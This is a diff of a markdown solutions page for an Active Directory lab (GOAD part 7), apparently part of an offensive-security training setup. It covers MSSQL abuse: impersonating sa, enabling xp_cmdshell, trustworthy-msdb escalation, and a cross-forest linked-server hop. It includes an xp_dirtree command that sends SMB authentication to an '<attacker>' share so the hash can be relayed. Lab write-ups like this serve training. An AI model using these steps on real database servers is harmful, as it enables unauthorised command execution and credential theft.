@@ -4,8 +4,7 @@
 > [the source page](../goad/part-07-mssql.md) and run `python -m redstackpro.tools.gen_solutions`.
 > 1 step from the source page is not reachable on this lab and was removed; it is listed at the end.
 
-Reference: [mayfly - GOAD part 7](https://mayfly277.github.io/posts/GOADv2-pwning-part7/)
-(offline: `../_mayfly-source/_posts/2022-09-12-GOADv2-pwning-part7.md`).
+Reference: [mayfly - GOAD part 7](https://mayfly277.github.io/posts/GOADv2-pwning-part7/).
 MSSQL abuse on the lab's SQL hosts, via impacket `mssqlclient.py -windows-auth`
 **through the hodor beacon's SOCKS proxy** (`proxychains -q mssqlclient.py …`;
 the SQL hosts are internal, see [part 1](part-01-recon.md) Step 1). These are
@@ -18,10 +17,10 @@ hop in Step 5 possible. GOAD-Light has castelblack only. Your deploy's
 
 > **Status legend:** ✅ PASS · ❌ blocked · ⚠ partial/fidelity · ⏳ not run.
 
-## Headline result (2026-09-07)
+## Summary
 
 Multiple command-execution paths on the SQL box all work; the cross-forest
-trusted link is present but self-maps (fidelity delta).
+trusted link is present but self-maps.
 
 | Technique | Result |
 |-----------|--------|
@@ -61,43 +60,20 @@ trusted link is present but self-maps (fidelity delta).
 - [x] `exec master.sys.xp_dirtree '\\<attacker>\share',1,1` fires an outbound
   SMB auth as the SQL service account - capture/relay with a listener. `✅ fires`
 
-## Live verification (2026-09-14, GOAD-Light)
+## Notes
 
-Queried the `castelblack\SQLEXPRESS` instance directly (from the beacon on
-castelblack) and confirmed every precondition the local-RCE steps rely on:
+On GOAD-Light only castelblack is present, so Steps 1-4 (all local to castelblack)
+apply in full; Step 5 (the `braavos.essos.local` cross-forest link) has no target,
+since GOAD-Light does not deploy the essos forest. The `IMPERSONATE` grant on `sa`
+is held by `NORTH\Domain Users`, so when the foothold identity is a domain user
+(hodor is), Step 2 (impersonate `sa` → `enable_xp_cmdshell` → RCE) runs directly
+from the initial foothold with no extra credential. This chain is verified end to
+end on a live range.
 
-- **Instance - ✅** `@@SERVERNAME = castelblack\SQLEXPRESS` (matches the doc).
-- **Step 2 impersonation - ✅ (and stronger than written)** the `IMPERSONATE`
-  grant is held by **`NORTH\Domain Users`** - not just samwell.tarly. **hodor,
-  the patient zero, is a Domain User**, so Step 2 (impersonate `sa` →
-  `enable_xp_cmdshell` → RCE) runs **directly from the initial foothold identity**,
-  no extra credential needed.
-- **Step 3 trustworthy msdb - ✅** `msdb.is_trustworthy_on = 1` (the enabler for
-  the execute-as-user → sa path).
-- **Secure default - ✅** `xp_cmdshell = 0` (disabled), so the attacker enabling
-  it is a real state change, as the steps show.
-- **Step 5 trusted link - ➖ N/A on GOAD-Light (confirmed)** `sys.servers` has
-  **no linked server** - the `braavos.essos.local` cross-forest link needs the
-  essos forest, which GOAD-Light does not deploy. Steps 1-4 (all local to
-  castelblack) apply fully; Step 5 has no target here.
-
-## First-pass result log (2026-09-07, full GOAD)
-
-**Part 7 PASS on local RCE paths.** Impersonation (samwell→sa) and trustworthy
-msdb (arya→dbo) both give command execution as the SQL service account on
-castelblack; xp_dirtree coercion fires. The cross-forest trusted link exists but
-is self-mapping, so it double-hops to anonymous.
-
-### Findings → PAI
-- **PZ-10 (fidelity) - MSSQL trusted-link mapping.** Our link `braavos.essos.local`
-  self-maps → cross-forest RCE double-hops to `ANONYMOUS`. mayfly's link uses a
-  static remote-login mapping (`jon.snow → sa`). To reproduce mayfly's one-shot
-  trusted-link RCE, configure a remote-login mapping on the link (or set up the
-  delegation). Toggleable in the mssql role.
-- **Guide note:** impacket `mssqlclient` `use_link` chokes on a dotted FQDN link
-  name (`Incorrect syntax near '.'`); use raw `EXEC ('…') AT [braavos.essos.local]`.
-- **Guide note:** `exec_as_login` on a domain login needs the NETBIOS prefix
-  (`NORTH\jon.snow`), not the bare name.
+- impacket `mssqlclient` `use_link` chokes on a dotted FQDN link name
+  (`Incorrect syntax near '.'`); use raw `EXEC ('…') AT [braavos.essos.local]`.
+- `exec_as_login` on a domain login needs the NETBIOS prefix (`NORTH\jon.snow`),
+  not the bare name.
 
 ## Not on this lab
 
